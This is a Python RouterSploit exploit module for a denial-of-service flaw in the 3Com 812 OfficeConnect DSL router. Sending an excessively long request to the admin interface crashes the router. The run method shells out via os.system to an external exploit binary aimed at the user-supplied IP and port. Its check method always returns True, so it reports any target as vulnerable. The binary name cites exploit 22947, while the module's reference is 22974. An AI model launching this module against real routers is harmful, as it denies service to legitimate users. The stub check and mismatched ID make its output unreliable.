import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "3Com_DSL_Router_812_1.1.7/1.1.9/2.0-Administrative_Interface_Long_Request_Denial_of_Service",

        "description": "A problem in the 3Com 812 OfficeConnect has been reported that may result in the router becoming unstable. Because "
                       "  of this, an attacker may be able to deny service to legitimate users of the "
                       "vulnerable router by submitting an excessively long request.  ",

        "authors": (

            "David F.Madrid",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/22974",

        ),

        "devices": (

            "3Com, EDB-ID:22974"
        ),
    }


    target = OptIP("", "3com_router ip")
    port = OptPort("", "Target HTTP port")


    
    def run(self):

        if self.check():
            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./exploit-db-22947 {0} {1}".format(self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
